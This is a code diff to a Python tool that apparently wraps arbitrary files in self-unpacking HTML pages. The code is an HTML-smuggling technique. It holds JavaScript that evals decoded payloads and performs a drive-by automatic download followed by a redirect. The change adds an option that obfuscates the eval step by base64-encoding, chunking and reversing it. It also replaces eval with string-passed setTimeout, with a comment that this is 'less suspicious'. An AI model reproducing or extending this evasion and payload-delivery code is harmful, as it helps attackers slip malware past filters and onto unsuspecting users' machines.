@@ -7,13 +7,13 @@ import os
 import sys
 from typing import Optional, Any
 # local
-from .minified_js import B64DECODE, B85DECODE, DECRYPT, UNZIP, HEXDUMP
+from .minified_js import B64DECODE, B85DECODE, DECRYPT, UNZIP, HEXDUMP, DECODE_AND_EVAL_ACTION
 
 SCRIPT_DIR = os.path.dirname(os.path.realpath(__file__))
 DEFAULT_TEMPLATE_FILE = os.path.join(SCRIPT_DIR, "template.html")
 
-JS_EVAL = "const og_text=new TextDecoder().decode(og_data);console.debug(`Evaluating code:\n${og_text}`);eval(og_text)"
-JS_REPLACE = 'const og_text=new TextDecoder().decode(og_data);setTimeout(()=>{console.log("replacing");let n=document.open("text/html","replace");n.write(og_text);n.close()}, 50);' # since decryption is async we do not catch the onload event anymore
+JS_EVAL = "setTimeout(new TextDecoder().decode(og_data))" # setTimeout works like eval (in a global context) if you pass it a string, but it is less suspicious
+JS_REPLACE = 'setTimeout(()=>{let n=document.open("text/html","replace");n.write(new TextDecoder().decode(og_data));n.close()}, 50);' # since decryption is async we do not catch the onload event anymore
 JS_DOWNLOAD = 'let b=new Blob([og_data],{type:"application/octet-stream"});let u=URL.createObjectURL(b);document.body.innerHTML=`<h1>Unpacked {{NAME}}</h1><a href="${u}" download="{{NAME}}">Click here to download</a>`'
 JS_DRIVEBY_REDIRECT = 'let b=new Blob([og_data],{type:"application/octet-stream"});let u=URL.createObjectURL(b);document.body.innerHTML=`<a href="${u}" download="{{NAME}}" id="auto-click"></a>`;document.getElementById("auto-click").click();location.href="{{REDIRECT_URL}}"'
 
@@ -43,7 +43,7 @@ def print_info(message):
 
 
 class PageBuilder:
-    def __init__(self, input_file: str, template_file: str, js_payload: str, encryption_password: Optional[str], password_hint: str, page_title: str, page_html: str) -> None:
+    def __init__(self, input_file: str, template_file: str, js_payload: str, encryption_password: Optional[str], password_hint: str, page_title: str, page_html: str, obscure_action: bool) -> None:
         try:
             with open(template_file, "r") as f:
                 self.template = f.read()
@@ -52,6 +52,7 @@ class PageBuilder:
 
         self.template = self.template.replace("{{TITLE}}", page_title)
         self.template = self.template.replace("{{HTML}}", page_html)
+        self.obscure_action = obscure_action
 
         try:
             if input_file == "-":
@@ -109,6 +110,12 @@ class PageBuilder:
             # This is much easier than modifying the existing encryption code to reuse the password, key, etc and perform separate decryptions for the payload and the action
             js_payload_action = "idx=og_data.indexOf(0);code=new TextDecoder().decode(og_data.slice(0,idx));og_data=og_data.slice(idx+1);eval(code);"
 
+        if self.obscure_action:
+            # takes a string, base64 encodes it, splits it into chunks of 5 characters, reverses their order and joins them with a -
+            encoded_action = base64.b64encode(js_payload_action.encode()).decode()
+            obscured_action = ('-'.join([b[::-1] for b in [encoded_action[i: i+5] for i in range(0, len(encoded_action), 5)]]))
+            js_payload_action = DECODE_AND_EVAL_ACTION.replace("{{OBSCURED_ACTION}}", obscured_action)
+
         if compression == "gzip":
             library_code += UNZIP
             encoded_data = gzip.compress(encoded_data)
@@ -153,7 +160,7 @@ class PageBuilder:
                 glue_code = f"await decryptLoop({glue_code})"
             if compression == "gzip":
                 glue_code = f"unzip({glue_code})"
-            
+
             glue_code = f"action({glue_code})"
             glue_code = "async function main(data){" + glue_code + "};main(c_data);"
 
@@ -201,6 +208,7 @@ def main() -> None:
     initial_page_contents_mutex = ap_template.add_mutually_exclusive_group()
     initial_page_contents_mutex.add_argument("--html", metavar="HTML_STRING", help="the HTML to show when the page is first loaded or if the unpacking fails")
     initial_page_contents_mutex.add_argument("--html-file", metavar="FILE", help="like --html, but read the contents from the given file")
+    ap_template.add_argument("--obscure-action", action="store_true", help="obscures the action that is performed decoding and basically evaling the code")
     args = ap.parse_args()
 
     if args.quiet:
@@ -229,7 +237,7 @@ def main() -> None:
     file_name = os.path.basename(args.file)
     java_script = get_javascript(args, file_name)
 
-    page_builder = PageBuilder(args.file, template_file, java_script, args.password, args.password_prompt, args.title, initial_page_contents)
+    page_builder = PageBuilder(args.file, template_file, java_script, args.password, args.password_prompt, args.title, initial_page_contents, args.obscure_action)
     html_page = page_builder.build_page(args.compression, args.encoding, args.console_log)
 
     if args.output:
